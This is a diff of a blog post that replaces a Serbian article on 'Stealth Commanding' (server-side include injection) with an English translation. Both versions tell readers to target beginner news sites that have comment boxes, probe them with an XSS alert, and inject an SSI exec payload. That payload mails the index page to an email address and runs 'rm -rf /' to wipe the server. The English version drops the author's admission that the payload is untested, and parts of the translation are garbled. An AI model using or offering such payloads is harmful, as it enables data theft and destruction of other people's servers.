@@ -15,33 +15,31 @@ summary: "My first post on my new blog."
 [5] How to protect
 
 
-[1] Šta je Stealth Commanding \
-Stealh Commanding je vrsta web napada u kome se pomoću SSI (Server-side inclusion) kodova iskorišćava ranjivosti istog.
-Ovaj napad se može izvesti ukoliko su u pitanju fajlovi sa ekstenzijom .asp ili .shtml
+[1] What is Stealth Commanding \
+Stealh Commanding is a type of web attack that comes with SSI (Server-side inclusion) codes exploiting its vulnerabilities.
+This attack can be performed if files with the extension .asp or .shtml are in question
 
-[2] Šta je SSI (Server-side inclusion) \
-SSI je način priključivanja nekih fajlova nekom fajlu.
+[2] What is SSI (Server-side inclusion) \
+SSI is a way of attaching some files to some file.
+In PHP, attaching files is done this way: include('header.php');
+while in ASP or SHTML it works like this: <!--#include virtual="fajl.html"-->
 
-U PHP-u se priključivanje fajlova radi na ovaj način: include('header.php');
-dok se u ASP ili SHTML radi na ovaj: <!--#include virtual="fajl.html"-->
+[3] How to find vulnerability \
+Since dorks for this vulnerability do not exist, it is most often targeted at beginner sites where you can comment on some news or similar.
+If the filters are misplaced or don't exist what this bug will do is, like XSS, edit the site code and execute the "command".
 
-[3] Kako uvideti ranjivost \
-Pošto dorkovi za ovu ranjivost ne postoje najčešće se cilja na početničke sajtove u kojima se može komentarisati neka vesti ili slično.
-Ako su filteri loše postavljeni ili ne postoje ono što će ova greška uraditi je da će poput XSS-a urediti kod sajta i izvršiti "naređenje".
+[4] Example of attack  \
+We came across a simple daily newspaper site and saw that if we leave a comment with the message<script>alert("XSS")</script> after refreshing
+it will throw us a message with the text XSS, which would mean that the site is vulnerable. The next thing we need to do is to instead of <script>alert("XSS")</script>
+<!--#include virtual="index.shtml"--> which will, for example, to the page /stranica/novost/ovaj-onaj-levo-desno.shtml add next to the basic things i
+index file.
 
-[4] Primer Napada \
-Naišli smo na jednostavan sajt dnevnih novina i uvideli da ako ostavimo komentar sa porukom<script>alert("XSS")</script> nakon refrešovanja
-izbaciće nam poruku sa tekstom XSS što bi značilo da je sajt ranjiv. Sledeće što trebamo da uradimo je da umesto <script>alert("XSS")</script>
-<!--#include virtual="index.shtml"--> što će na npr. stranici /stranica/novost/ovaj-onaj-levo-desno.shtml dodati pored osnovne stvari i
-index fajl.
-
-E sada moja teorija za iskorišćavanje ove ranjivosti je sledeća
+If we inject code like this
 ```jsx
-<!--#exec cmd="mail -s 'Index sajta' moj.email@mail.com <index.shtml; rm -rf /"-->
+<!--#exec cmd="mail -s 'Index' example@email.com <index.shtml; rm -rf /"-->
 ```
+Which will trigger a command to be sent to my email with the title Site Index
+with the code of the index page and then format the server.
 
-Što će pokrenuti komandu da se pošalje na moj email poruka sa naslovom Index sajta
-sa kodom index stranice i nakon toga formatirati server. Ovo još nije testirano zato sam koristio prostu include komandu kao primer.
-
-[5] Zaštita skripte \
-Da bi zaštitili naš sajt od ovog napada dovoljno je da se napravi dobar filter i komentari sa approving opcijom i to je to.
+[5] How to protect \
+To protect our site from this attack, it is enough to create a good filters and input validation as well as keeping systems up-to-date
